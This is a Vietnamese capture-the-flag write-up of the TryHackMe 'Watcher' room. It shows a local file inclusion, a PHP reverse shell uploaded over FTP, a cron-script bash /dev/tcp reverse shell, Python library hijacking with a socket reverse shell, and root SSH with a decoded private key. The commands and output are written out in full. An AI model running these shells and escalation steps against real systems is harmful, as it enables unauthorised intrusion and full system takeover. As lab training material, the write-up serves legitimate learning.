---
layout: post
author: "Neo"
title: "Tryhackme - Watcher"
date: "2022-05-19"
tags: [
    "tryhackme",
    "web",
    "linux",
	"cron",
    "ftp",
    "python",
    "lfi",
    "ssh"
]
categories: ctf
---

0. this unordered seed list will be replaced by toc as unordered list
{:toc}

[TryHackMe - Watcher](https://tryhackme.com/room/watcher)

## Reconnaissance and Scanning

```python
PORT   STATE SERVICE REASON         VERSION
21/tcp open  ftp     syn-ack ttl 63 vsftpd 3.0.3
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 e1:80:ec:1f:26:9e:32:eb:27:3f:26:ac:d2:37:ba:96 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC7hN8ixZsMzRUvaZjiBUrqtngTVOcdko2FRpRMT0D/LTRm8x8SvtI5a52C/adoiNNreQO5/DOW8k5uxY1Rtx/HGvci9fdbplPz7RLtt+Mc9pgGHj0ZEm/X0AfhBF0P3Uwf3paiqCqeDcG1HHVceFUKpDt0YcBeiG1JJ5LZpRxqAyd0jOJsC1FBNBPZAtUA11KOEvxbg5j6pEL1rmbjwGKUVxM8HIgSuU6R6anZxTrpUPvcho9W5F3+JSxl/E+vF9f51HtIQcXaldiTNhfwLsklPcunDw7Yo9IqhqlORDrM7biQOtUnanwGZLFX7kfQL28r9HbEwpAHxdScXDFmu5wR
|   256 36:ff:70:11:05:8e:d4:50:7a:29:91:58:75:ac:2e:76 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBBmjWU4CISIz0mdwq6ObddQ3+hBuOm49wam2XHUdUaJkZHf4tOqzl+HVz107toZIXKn1ui58hl9+6ojTnJ6jN/Y=
|   256 48:d2:3e:45:da:0c:f0:f6:65:4e:f9:78:97:37:aa:8a (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIHb7zsrJYdPY9eb0sx8CvMphZyxajGuvbDShGXOV9MDX
80/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.29 ((Ubuntu))
|_http-generator: Jekyll v4.1.1
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Corkplacemats
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```

### Flag 1

Truy cập vào web service với port 80

Phân tích qua về trang web này thì tôi tìm được `robots.txt`, truy cập vào path này và tôi có flag đầu tiên

```python
User-agent: *
Allow: /flag_1.txt
Allow: /secret_file_do_not_read.txt
```

```python
┌──(root㉿kali)-[/home/kali]
└─# curl http://10.10.80.186/flag_1.txt
FLAG{robots_dot_text_what_is_next}
```

### Flag 2

Với file số 2 thì tôi không truy cập được. Phân tích qua source web 

```python
 <div class="row">
        <div class="col-md-4">
          <div class="card mb-4 shadow-sm">
           <a href="post.php?post=striped.php"><img src="images/placemat1.jpg" width="100%" height="225"/></a>
            <div class="card-body">
              <p class="card-text">This placemat has a beautiful striped pattern, both pleasing for the eye and functional.</p>
              <div class="d-flex justify-content-between align-items-center">
                <div class="btn-group">
                  <button type="button" class="btn btn-sm btn-outline-secondary">View</button>
                </div>
                <small class="text-muted">2 mins</small>
              </div>
            </div>
          </div>
        </div>
        <div class="col-md-4">
          <div class="card mb-4 shadow-sm">
	   <a href="post.php?post=round.php"><img src="images/placemat2.jpg" width="100%" height="225"/></a>
            <div class="card-body">
             <p class="card-text">This placemat is round! Crazy, huh? What's next, an octagon placemat? Haha, hahahah</p>
              <div class="d-flex justify-content-between align-items-center">
                <div class="btn-group">
                  <button type="button" class="btn btn-sm btn-outline-secondary">View</button>
                </div>
                <small class="text-muted">9 mins</small>
              </div>
            </div>
          </div>
        </div>
        <div class="col-md-4">
          <div class="card mb-4 shadow-sm">
           <a href="post.php?post=bunch.php"><img src="images/placemat3.jpg" width="100%" height="225"/></a>
            <div class="card-body">
              <p class="card-text">This one has a whole bunch of placemats. You're basically spoiled for choice here. Be grateful.</p>
              <div class="d-flex justify-content-between align-items-center">
                <div class="btn-group">
                  <button type="button" class="btn btn-sm btn-outline-secondary">View</button>
                </div>
```

Ở phần trên có thể thấy path `post.php?post=` khá giống với lỗ hổng [LFI](https://swisskyrepo.github.io/PayloadsAllTheThings/File%20Inclusion/#basic-lfi)

Tôi sẽ thử mở file trên bằng cách này

```python
┌──(root㉿kali)-[/home/kali]
└─# curl http://10.10.80.186/post.php?post=secret_file_do_not_read.txt
<!doctype html>
<html lang="en">

...

<main role="main">

<div class="row">
 <div class="col-2"></div>
 <div class="col-8">
  Hi Mat,

The credentials for the FTP server are below. I've set the files to be saved to /home/ftpuser/ftp/files.

Will

----------

ftpuser:givemefiles777
 </div>
</div>

</main>
```

Truy cập ftp với port 21 

```python
┌──(root㉿kali)-[/home/kali]
└─# ftp 10.10.80.186
Connected to 10.10.80.186.
220 (vsFTPd 3.0.3)
Name (10.10.80.186:kali): ftpuser
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> dir
229 Entering Extended Passive Mode (|||45370|)
150 Here comes the directory listing.
drwxr-xr-x    2 1001     1001         4096 Dec 03  2020 files
-rw-r--r--    1 0        0              21 Dec 03  2020 flag_2.txt
226 Directory send OK.
ftp> get flag_2.txt /home/kali/flag2.txt
local: /home/kali/flag2.txt remote: flag_2.txt
229 Entering Extended Passive Mode (|||40425|)
150 Opening BINARY mode data connection for flag_2.txt (21 bytes).
100% |****************************************************************************************************************************************************************************************************************|    21       19.38 KiB/s    00:00 ETA
226 Transfer complete.
21 bytes received in 00:00 (0.09 KiB/s)
```

```python
┌──(root㉿kali)-[/home/kali]
└─# cat flag2.txt                                                     
FLAG{ftp_you_and_me}
```

## RCE

### Flag 3

Quay lại ftp một chút thì tôi còn có 1 folder tên `files` bên trong. Vậy thì tôi có thể tải RCE lên đó và mở nó trên web

Vì web dùng php nên tôi sẽ sử dụng [**PentestMonkey** shell](https://www.revshells.com/) cho đơn giản.

Tạo file `revshell.php`, sao chép toàn bộ code RCE về, lưu nó lại và tải nó lên ftp 

```python
┌──(root㉿kali)-[/home/kali]
└─# ftp 10.10.80.186      
Connected to 10.10.80.186.
220 (vsFTPd 3.0.3)
Name (10.10.80.186:kali): ftpuser
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> cd files
250 Directory successfully changed.
ftp> put revshell.php 
local: revshell.php remote: revshell.php
229 Entering Extended Passive Mode (|||49612|)
150 Ok to send data.
100% |********************************************************************************|  2593        9.40 MiB/s    00:00 ETA
226 Transfer complete.
2593 bytes sent in 00:00 (5.91 KiB/s)
ftp> dir
229 Entering Extended Passive Mode (|||40158|)
150 Here comes the directory listing.
-rw-r--r--    1 1001     1001         2593 Jul 28 10:42 revshell.php
226 Directory send OK.
ftp> 
```

Tạo listener với port 9001

```python
┌──(root㉿kali)-[/home/kali]
└─# nc -lnvp 9001    
listening on [any] 9001 ...

```

Truy cập RCE với web 

```python
┌──(kali㉿kali)-[~]
└─$ curl http://10.10.80.186/post.php?post=../../../home/ftpuser/ftp/files/revshell.php
```

Quay lại listener và tôi có shell

```python
┌──(root㉿kali)-[/home/kali]
└─# nc -lnvp 9001
listening on [any] 9001 ...
connect to [10.8.105.194] from (UNKNOWN) [10.10.80.186] 54208
Linux watcher 4.15.0-128-generic #131-Ubuntu SMP Wed Dec 9 06:57:35 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
 10:45:44 up 54 min,  0 users,  load average: 0.00, 0.00, 0.05
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
bash: cannot set terminal process group (942): Inappropriate ioctl for device
bash: no job control in this shell
www-data@watcher:/$ id
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
www-data@watcher:/$ 
```

Bây giờ thì việc tìm các flag sẽ đơn giản hơn. Với flag số 3 tôi có thể dùng cách sau

```python
www-data@watcher:/home$ find / -type f -name flag_3.txt 2>/dev/null
find / -type f -name flag_3.txt 2>/dev/null
/var/www/html/more_secrets_a9f10a/flag_3.txt
www-data@watcher:/home$ cat /var/www/html/more_secrets_a9f10a/flag_3.txt
cat /var/www/html/more_secrets_a9f10a/flag_3.txt
FLAG{lfi_what_a_guy}
www-data@watcher:/home$ 
```

## Privilege escalation

### flag 4

Tiếp tục phân tích máy này bằng các lệnh đơn giản, tôi có `sudo -l`

```python
www-data@watcher:/tmp$ sudo -l
sudo -l
Matching Defaults entries for www-data on watcher:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on watcher:
    (toby) NOPASSWD: ALL
```

Điều này có nghĩa là tôi có thể chuyển sang user **toby** mà không cần khai báo password

```python
www-data@watcher:/tmp$ sudo -u toby bash
sudo -u toby bash
id
uid=1003(toby) gid=1003(toby) groups=1003(toby)
```

Và tôi có flag số 4

```python
cd /home/toby
cat flag_4.txt
FLAG{chad_lifestyle}
```

### flag 5

Ở user **toby** tôi có thêm 1 file txt và 1 folder khác

```python
id
uid=1003(toby) gid=1003(toby) groups=1003(toby)
ls
flag_4.txt
jobs
note.txt
```

`note.txt`

```python
cat note.txt
Hi Toby,

I've got the cron jobs set up now so don't worry about getting that done.

Mat
```

`/jobs`

```python
ls jobs
cow.sh
cat jobs/cow.sh
#!/bin/bash
cp /home/mat/cow.jpg /tmp/cow.jpg
```

Kiểm tra crontab

```python
cat /etc/crontab
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user  command
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
#
*/1 * * * * mat /home/toby/jobs/cow.sh
```

Vậy là tiến trình này cho user **mat** chạy file `cow.sh`, mà **toby** đang sở hữu file này, nghĩa là **toby** có quyền chỉnh sửa nó. Tôi sẽ thêm shell vào `cow.sh` để khi nó được chạy theo lịch, tôi sẽ chiếm được quyền của **mat**

Trước đó thì tôi phải tạo listener đã

```python
┌──(root㉿kali)-[/home/kali]
└─# nc -lnvp 4444
listening on [any] 4444 ...
```

Quay lại shell

```python
pwd                                                                  
/home/toby
cd jobs
echo 'bash -c "bash -i >& /dev/tcp/10.8.105.194/4444 0>&1"' >> cow.sh
cat cow.sh
#!/bin/bash
cp /home/mat/cow.jpg /tmp/cow.jpg
bash -c "bash -i >& /dev/tcp/10.8.105.194/4444 0>&1"
```

Chờ một lúc để `cron` làm việc của nó

```python
┌──(root㉿kali)-[/home/kali]
└─# nc -lnvp 4444
listening on [any] 4444 ...
connect to [10.8.105.194] from (UNKNOWN) [10.10.80.186] 35940
bash: cannot set terminal process group (2572): Inappropriate ioctl for device
bash: no job control in this shell
mat@watcher:~$ id
id
uid=1002(mat) gid=1002(mat) groups=1002(mat)
mat@watcher:~$ 
```

Và tôi có flag số 5

```python
mat@watcher:~$ pwd
pwd
/home/mat
mat@watcher:~$ ls
ls
cow.jpg
flag_5.txt
note.txt
scripts
mat@watcher:~$ cat flag_5.txt
cat flag_5.txt
FLAG{live_by_the_cow_die_by_the_cow}
mat@watcher:~$ 
```

### Flag 6

Ở đây tôi lại có thêm 1 file txt và 1 folder 

`note.txt`

```python
mat@watcher:~$ cat note.txt
cat note.txt
Hi Mat,

I've set up your sudo rights to use the python script as my user. You can only run the script with sudo so it should be safe.

Will
```

`/scripts`

```python
mat@watcher:~$ ls scripts
ls scripts
cmd.py
will_script.py
mat@watcher:~$ cat scripts/cmd.py
cat scripts/cmd.py
def get_command(num):
        if(num == "1"):
                return "ls -lah"
        if(num == "2"):
                return "id"
        if(num == "3"):
                return "cat /etc/passwd"
                
mat@watcher:~$ cat scripts/will_script.py
cat scripts/will_script.py
import os
import sys
from cmd import get_command

cmd = get_command(sys.argv[1])

whitelist = ["ls -lah", "id", "cat /etc/passwd"]

if cmd not in whitelist:
        print("Invalid command!")
        exit()

os.system(cmd)
```

Với note phía trên, tôi thử `sudo -l`

```python
mat@watcher:~$ sudo -l
sudo -l
Matching Defaults entries for mat on watcher:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User mat may run the following commands on watcher:
    (will) NOPASSWD: /usr/bin/python3 /home/mat/scripts/will_script.py *
```

Điều này có nghĩa là tôi có thể chạy file `will_script.py` bằng user **will** mà không cần khai báo password. Nhìn vào nội dung bên trên thì `will_script.py` sẽ import `cmd.py` làm thư viện. Vậy thì tôi sẽ thêm shell vào `cmd.py` để `will_script.py` thực thi nó

[Shell tôi sử dụng](https://book.hacktricks.xyz/linux-hardening/privilege-escalation#python-library-hijacking)

```python
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.14",5678));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);
```

Thay đổi ip và port

```python
mat@watcher:~/scripts$ echo 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.8.105.194",6666));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")' >> cmd.py
<(),2);import pty; pty.spawn("/bin/bash")' >> cmd.py
```

Tạo listener với port 6666

```python
┌──(root㉿kali)-[/home/kali]
└─# nc -lnvp 6666
listening on [any] 6666 ...
```

Thực thi

```python
mat@watcher:~/scripts$ sudo -u will /usr/bin/python3 /home/mat/scripts/will_script.py 1
```

Quay lại listener

```python
┌──(root㉿kali)-[/home/kali]
└─# nc -lnvp 6666
listening on [any] 6666 ...
connect to [10.8.105.194] from (UNKNOWN) [10.10.80.186] 56418
will@watcher:~/scripts$ id
id
uid=1000(will) gid=1000(will) groups=1000(will),4(adm)
will@watcher:~/scripts$ cd /home/will
cd /home/will
will@watcher:/home/will$ ls
ls
flag_6.txt
will@watcher:/home/will$ cat flag_6.txt 
cat flag_6.txt
FLAG{but_i_thought_my_script_was_secure}
will@watcher:/home/will$ 
```

## SSH

### Flag 7

Tôi không còn dùng được `sudo -l` nữa vì cần password. Tuy nhiên tôi để ý thấy user **will** thuộc group **adm**. Tôi sẽ tìm các file thuộc group này

```python
will@watcher:/home/will$ find / -type f -group adm 2>/dev/null
find / -type f -group adm 2>/dev/null
/opt/backups/key.b64
/var/log/auth.log
/var/log/kern.log
/var/log/syslog
/var/log/apache2/access.log
/var/log/apache2/error.log
/var/log/apache2/other_vhosts_access.log
/var/log/cloud-init.log
/var/log/unattended-upgrades/unattended-upgrades-dpkg.log
/var/log/apt/term.log
```

Có 1 file key ở đây

```python
will@watcher:/home/will$ cat /opt/backups/key.b64
cat /opt/backups/key.b64
LS0tLS1CRUdJTiBSU0EgUFJJVkFURSBLRVktLS0tLQpNSUlFcEFJQkFBS0NBUUVBelBhUUZvbFFx
OGNIb205bXNzeVBaNTNhTHpCY1J5QncrcnlzSjNoMEpDeG5WK2FHCm9wWmRjUXowMVlPWWRqWUlh
WkVKbWRjUFZXUXAvTDB1YzV1M2lnb2lLMXVpWU1mdzg1ME43dDNPWC9lcmRLRjQKanFWdTNpWE45
ZG9CbXIzVHVVOVJKa1ZuRER1bzh5NER0SXVGQ2Y5MlpmRUFKR1VCMit2Rk9ON3E0S0pzSXhnQQpu
TThrajhOa0ZrRlBrMGQxSEtIMitwN1FQMkhHWnJmM0RORm1RN1R1amEzem5nYkVWTzdOWHgzVjNZ
T0Y5eTFYCmVGUHJ2dERRVjdCWWI2ZWdrbGFmczRtNFhlVU8vY3NNODRJNm5ZSFd6RUo1enBjU3Jw
bWtESHhDOHlIOW1JVnQKZFNlbGFiVzJmdUxBaTUxVVIvMndOcUwxM2h2R2dscGVQaEtRZ1FJREFR
QUJBb0lCQUhtZ1RyeXcyMmcwQVRuSQo5WjVnZVRDNW9VR2padjdtSjJVREZQMlBJd3hjTlM4YUl3
YlVSN3JRUDNGOFY3cStNWnZEYjNrVS80cGlsKy9jCnEzWDdENTBnaWtwRVpFVWVJTVBQalBjVU5H
VUthWG9hWDVuMlhhWUJ0UWlSUjZaMXd2QVNPMHVFbjdQSXEyY3oKQlF2Y1J5UTVyaDZzTnJOaUpR
cEdESkRFNTRoSWlnaWMvR3VjYnluZXpZeWE4cnJJc2RXTS8wU1VsOUprbkkwUQpUUU9pL1gyd2Z5
cnlKc20rdFljdlk0eWRoQ2hLKzBuVlRoZWNpVXJWL3drRnZPRGJHTVN1dWhjSFJLVEtjNkI2CjF3
c1VBODUrdnFORnJ4ekZZL3RXMTg4VzAwZ3k5dzUxYktTS0R4Ym90aTJnZGdtRm9scG5Gdyt0MFFS
QjVSQ0YKQWxRSjI4a0NnWUVBNmxyWTJ4eWVMaC9hT0J1OStTcDN1SmtuSWtPYnBJV0NkTGQxeFhO
dERNQXo0T3FickxCNQpmSi9pVWNZandPQkh0M05Oa3VVbTZxb0VmcDRHb3UxNHlHek9pUmtBZTRI
UUpGOXZ4RldKNW1YK0JIR0kvdmoyCk52MXNxN1BhSUtxNHBrUkJ6UjZNL09iRDd5UWU3OE5kbFF2
TG5RVGxXcDRuamhqUW9IT3NvdnNDZ1lFQTMrVEUKN1FSNzd5UThsMWlHQUZZUlhJekJncDVlSjJB
QXZWcFdKdUlOTEs1bG1RL0UxeDJLOThFNzNDcFFzUkRHMG4rMQp2cDQrWThKMElCL3RHbUNmN0lQ
TWVpWDgwWUpXN0x0b3pyNytzZmJBUVoxVGEybzFoQ2FsQVF5SWs5cCtFWHBJClViQlZueVVDMVhj
dlJmUXZGSnl6Z2Njd0V4RXI2Z2xKS09qNjRiTUNnWUVBbHhteC9qeEtaTFRXenh4YjlWNEQKU1Bz
K055SmVKTXFNSFZMNFZUR2gydm5GdVR1cTJjSUM0bTUzem4reEo3ZXpwYjFyQTg1SnREMmduajZu
U3I5UQpBL0hiakp1Wkt3aTh1ZWJxdWl6b3Q2dUZCenBvdVBTdVV6QThzOHhIVkk2ZWRWMUhDOGlw
NEptdE5QQVdIa0xaCmdMTFZPazBnejdkdkMzaEdjMTJCcnFjQ2dZQWhGamkzNGlMQ2kzTmMxbHN2
TDRqdlNXbkxlTVhuUWJ1NlArQmQKYktpUHd0SUcxWnE4UTRSbTZxcUM5Y25vOE5iQkF0aUQ2L1RD
WDFrejZpUHE4djZQUUViMmdpaWplWVNKQllVTwprSkVwRVpNRjMwOFZuNk42L1E4RFlhdkpWYyt0
bTRtV2NOMm1ZQnpVR1FIbWI1aUpqa0xFMmYvVHdZVGcyREIwCm1FR0RHd0tCZ1FDaCtVcG1UVFJ4
NEtLTnk2d0prd0d2MnVSZGo5cnRhMlg1cHpUcTJuRUFwa2UyVVlsUDVPTGgKLzZLSFRMUmhjcDlG
bUY5aUtXRHRFTVNROERDYW41Wk1KN09JWXAyUloxUnpDOUR1ZzNxa3R0a09LQWJjY0tuNQo0QVB4
STFEeFUrYTJ4WFhmMDJkc1FIMEg1QWhOQ2lUQkQ3STVZUnNNMWJPRXFqRmRaZ3Y2U0E9PQotLS0t
LUVORCBSU0EgUFJJVkFURSBLRVktLS0tLQo=
```

Nó đã được mã hóa base64. Phải thêm 1 bước decode nữa

```python
will@watcher:/home/will$ cat /opt/backups/key.b64 | base64 -d
cat /opt/backups/key.b64 | base64 -d
-----BEGIN RSA PRIVATE KEY-----
MIIEpAIBAAKCAQEAzPaQFolQq8cHom9mssyPZ53aLzBcRyBw+rysJ3h0JCxnV+aG
opZdcQz01YOYdjYIaZEJmdcPVWQp/L0uc5u3igoiK1uiYMfw850N7t3OX/erdKF4
jqVu3iXN9doBmr3TuU9RJkVnDDuo8y4DtIuFCf92ZfEAJGUB2+vFON7q4KJsIxgA
nM8kj8NkFkFPk0d1HKH2+p7QP2HGZrf3DNFmQ7Tuja3zngbEVO7NXx3V3YOF9y1X
eFPrvtDQV7BYb6egklafs4m4XeUO/csM84I6nYHWzEJ5zpcSrpmkDHxC8yH9mIVt
dSelabW2fuLAi51UR/2wNqL13hvGglpePhKQgQIDAQABAoIBAHmgTryw22g0ATnI
9Z5geTC5oUGjZv7mJ2UDFP2PIwxcNS8aIwbUR7rQP3F8V7q+MZvDb3kU/4pil+/c
q3X7D50gikpEZEUeIMPPjPcUNGUKaXoaX5n2XaYBtQiRR6Z1wvASO0uEn7PIq2cz
BQvcRyQ5rh6sNrNiJQpGDJDE54hIigic/GucbynezYya8rrIsdWM/0SUl9JknI0Q
TQOi/X2wfyryJsm+tYcvY4ydhChK+0nVTheciUrV/wkFvODbGMSuuhcHRKTKc6B6
1wsUA85+vqNFrxzFY/tW188W00gy9w51bKSKDxboti2gdgmFolpnFw+t0QRB5RCF
AlQJ28kCgYEA6lrY2xyeLh/aOBu9+Sp3uJknIkObpIWCdLd1xXNtDMAz4OqbrLB5
fJ/iUcYjwOBHt3NNkuUm6qoEfp4Gou14yGzOiRkAe4HQJF9vxFWJ5mX+BHGI/vj2
Nv1sq7PaIKq4pkRBzR6M/ObD7yQe78NdlQvLnQTlWp4njhjQoHOsovsCgYEA3+TE
7QR77yQ8l1iGAFYRXIzBgp5eJ2AAvVpWJuINLK5lmQ/E1x2K98E73CpQsRDG0n+1
vp4+Y8J0IB/tGmCf7IPMeiX80YJW7Ltozr7+sfbAQZ1Ta2o1hCalAQyIk9p+EXpI
UbBVnyUC1XcvRfQvFJyzgccwExEr6glJKOj64bMCgYEAlxmx/jxKZLTWzxxb9V4D
SPs+NyJeJMqMHVL4VTGh2vnFuTuq2cIC4m53zn+xJ7ezpb1rA85JtD2gnj6nSr9Q
A/HbjJuZKwi8uebquizot6uFBzpouPSuUzA8s8xHVI6edV1HC8ip4JmtNPAWHkLZ
gLLVOk0gz7dvC3hGc12BrqcCgYAhFji34iLCi3Nc1lsvL4jvSWnLeMXnQbu6P+Bd
bKiPwtIG1Zq8Q4Rm6qqC9cno8NbBAtiD6/TCX1kz6iPq8v6PQEb2giijeYSJBYUO
kJEpEZMF308Vn6N6/Q8DYavJVc+tm4mWcN2mYBzUGQHmb5iJjkLE2f/TwYTg2DB0
mEGDGwKBgQCh+UpmTTRx4KKNy6wJkwGv2uRdj9rta2X5pzTq2nEApke2UYlP5OLh
/6KHTLRhcp9FmF9iKWDtEMSQ8DCan5ZMJ7OIYp2RZ1RzC9Dug3qkttkOKAbccKn5
4APxI1DxU+a2xXXf02dsQH0H5AhNCiTBD7I5YRsM1bOEqjFdZgv6SA==
-----END RSA PRIVATE KEY-----
```

Sao chép key này về máy và login ssh

```python                                                                                                                        
┌──(root㉿kali)-[/home/kali]
└─# ssh -i id_rsa 10.10.80.186                                                                                                                                                                                                                        
The authenticity of host '10.10.80.186 (10.10.80.186)' can't be established.
ED25519 key fingerprint is SHA256:/60sf9gTocupkmAaJjtQJTxW1ZnolBZckE6KpPiQi5s.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.80.186' (ED25519) to the list of known hosts.
Welcome to Ubuntu 18.04.5 LTS (GNU/Linux 4.15.0-128-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Fri Jul 28 12:10:25 UTC 2023

  System load:  0.0                Processes:             118
  Usage of /:   22.5% of 18.57GB   Users logged in:       0
  Memory usage: 52%                IP address for eth0:   10.10.80.186
  Swap usage:   0%                 IP address for lxdbr0: 10.14.179.1


33 packages can be updated.
0 updates are security updates.


Last login: Thu Dec  3 03:25:38 2020
root@watcher:~# 
root@watcher:~# id
uid=0(root) gid=0(root) groups=0(root)
root@watcher:~# cat /root/flag_7.txt 
FLAG{who_watches_the_watchers}
root@watcher:~# 
```

